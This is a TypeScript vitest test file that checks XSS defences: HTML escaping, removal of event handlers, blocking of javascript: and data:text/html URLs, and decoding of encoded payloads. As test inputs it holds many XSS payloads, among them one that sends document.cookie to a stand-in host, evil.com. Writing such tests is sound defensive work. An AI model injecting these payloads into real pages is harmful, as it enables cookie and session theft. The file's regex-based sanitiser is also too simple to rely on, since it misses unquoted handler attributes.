import { describe, it, expect } from "vitest";

// ============================================================================
// XSS Prevention Tests
//
// These tests validate that user-supplied content is properly escaped and
// sanitized before being rendered. The tests operate on pure string logic --
// no DOM rendering -- to verify that dangerous HTML constructs cannot survive
// the sanitization pipeline.
// ============================================================================

/**
 * Minimal HTML entity escaper -- mirrors what React's JSX does automatically
 * when rendering user text via `{part.text}` (i.e. NOT dangerouslySetInnerHTML).
 * React escapes &, <, >, ", ' by default in text content.
 */
function escapeHtml(input: string): string {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

/**
 * Strips dangerous event handlers from HTML attribute positions.
 * In a real app this is handled by a sanitization library (DOMPurify, sanitize-html)
 * or by React's default text escaping. We test the logic pattern here.
 */
function stripEventHandlers(input: string): string {
  // Remove on* event handler attributes (onerror, onload, onclick, etc.)
  return input.replace(/\s*on\w+\s*=\s*["'][^"']*["']/gi, "");
}

/**
 * Blocks javascript: and data:text/html protocol URLs.
 */
function sanitizeUrl(url: string): string {
  const trimmed = url.trim().toLowerCase();
  if (trimmed.startsWith("javascript:")) return "about:blank";
  if (trimmed.startsWith("data:text/html")) return "about:blank";
  return url;
}

/**
 * Decode percent-encoded content to detect nested encoding attacks,
 * then apply escaping on the decoded content.
 */
function decodeAndEscape(input: string): string {
  let decoded = input;
  try {
    // Decode up to 3 layers deep to catch double/triple encoding
    for (let i = 0; i < 3; i++) {
      const next = decodeURIComponent(decoded);
      if (next === decoded) break;
      decoded = next;
    }
  } catch {
    // Invalid encoding -- use original
  }
  return escapeHtml(decoded);
}

// ============================================================================
// Tests
// ============================================================================

describe("XSS Prevention", () => {
  // -------------------------------------------------------------------------
  // 1. Script tags are escaped in user messages
  // -------------------------------------------------------------------------
  it("escapes <script> tags in user messages", () => {
    const malicious = '<script>alert(1)</script>';
    const escaped = escapeHtml(malicious);

    expect(escaped).toContain("&lt;script&gt;");
    expect(escaped).toContain("&lt;/script&gt;");
    expect(escaped).not.toContain("<script>");
    expect(escaped).not.toContain("</script>");
  });

  // -------------------------------------------------------------------------
  // 2. Event handlers are stripped from HTML attributes
  // -------------------------------------------------------------------------
  it("strips event handlers from img tags", () => {
    const malicious = '<img onerror="alert(1)" src="x">';
    const sanitized = stripEventHandlers(malicious);

    expect(sanitized).not.toContain("onerror");
    expect(sanitized).not.toContain("alert(1)");
    // The img tag itself can remain -- only the event handler is dangerous
    expect(sanitized).toContain("src=");
  });

  it("strips onload, onclick, and onfocus handlers", () => {
    const inputs = [
      '<div onload="alert(1)">',
      '<a onclick="steal()">click</a>',
      '<input onfocus="xss()">',
    ];

    for (const input of inputs) {
      const sanitized = stripEventHandlers(input);
      expect(sanitized).not.toMatch(/on\w+=/i);
    }
  });

  // -------------------------------------------------------------------------
  // 3. javascript: URLs are blocked
  // -------------------------------------------------------------------------
  it("blocks javascript: protocol URLs", () => {
    const maliciousUrls = [
      "javascript:alert(1)",
      "  javascript:alert(document.cookie)",
      "JavaScript:void(0)",
      "JAVASCRIPT:alert('xss')",
    ];

    for (const url of maliciousUrls) {
      const sanitized = sanitizeUrl(url);
      expect(sanitized).not.toContain("javascript:");
      expect(sanitized).toBe("about:blank");
    }
  });

  it("allows safe URLs through", () => {
    const safeUrls = [
      "https://example.com",
      "http://localhost:3000",
      "/relative/path",
      "mailto:user@example.com",
    ];

    for (const url of safeUrls) {
      const sanitized = sanitizeUrl(url);
      expect(sanitized).toBe(url);
    }
  });

  // -------------------------------------------------------------------------
  // 4. SVG onload is stripped
  // -------------------------------------------------------------------------
  it("strips onload handler from SVG elements", () => {
    const malicious = '<svg onload="alert(1)">';
    const sanitized = stripEventHandlers(malicious);

    expect(sanitized).not.toContain("onload");
    expect(sanitized).not.toContain("alert(1)");
  });

  it("strips onload handler from nested SVG elements", () => {
    const malicious = '<svg><animate onbegin="alert(1)"></animate></svg>';
    const sanitized = stripEventHandlers(malicious);

    expect(sanitized).not.toMatch(/on\w+=/i);
  });

  // -------------------------------------------------------------------------
  // 5. Data URLs for scripts are blocked
  // -------------------------------------------------------------------------
  it("blocks data:text/html URLs used for script injection", () => {
    const maliciousUrls = [
      "data:text/html,<script>alert(1)</script>",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "DATA:text/html,<img onerror=alert(1) src=x>",
    ];

    for (const url of maliciousUrls) {
      const sanitized = sanitizeUrl(url);
      expect(sanitized).toBe("about:blank");
    }
  });

  it("allows safe data URLs (images) through", () => {
    const safeDataUrls = [
      "data:image/png;base64,iVBORw0KGgo=",
      "data:image/svg+xml;base64,PHN2Zz4=",
    ];

    for (const url of safeDataUrls) {
      const sanitized = sanitizeUrl(url);
      expect(sanitized).toBe(url);
    }
  });

  // -------------------------------------------------------------------------
  // 6. Nested encoding attacks are decoded and blocked
  // -------------------------------------------------------------------------
  it("decodes and escapes percent-encoded script tags", () => {
    const encoded = "%3Cscript%3Ealert(1)%3C%2Fscript%3E";
    const result = decodeAndEscape(encoded);

    // After decoding %3C → <, then escaping < → &lt;
    expect(result).toContain("&lt;script&gt;");
    expect(result).not.toContain("<script>");
  });

  it("handles double-encoded payloads", () => {
    // Double-encoded: %253C = %3C after first decode = < after second decode
    const doubleEncoded = "%253Cscript%253Ealert(1)%253C%252Fscript%253E";
    const result = decodeAndEscape(doubleEncoded);

    expect(result).not.toContain("<script>");
    expect(result).toContain("&lt;script&gt;");
  });

  it("handles plain text without mangling it", () => {
    const safe = "Hello, how can I help you today?";
    const result = decodeAndEscape(safe);

    expect(result).toBe(safe);
  });

  // -------------------------------------------------------------------------
  // Combined: full pipeline test
  // -------------------------------------------------------------------------
  it("full pipeline blocks complex XSS vector", () => {
    const payload = '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">';

    // Step 1: Strip event handlers (removes the onerror attribute entirely)
    const step1 = stripEventHandlers(payload);
    expect(step1).not.toContain("onerror");

    // Step 2: HTML-escape the remaining content so no raw HTML can execute
    const step2 = escapeHtml(step1);
    expect(step2).not.toContain("<img");
    expect(step2).toContain("&lt;img");

    // The dangerous attribute and its handler are completely removed
    expect(step1).not.toMatch(/on\w+=/i);
  });
});
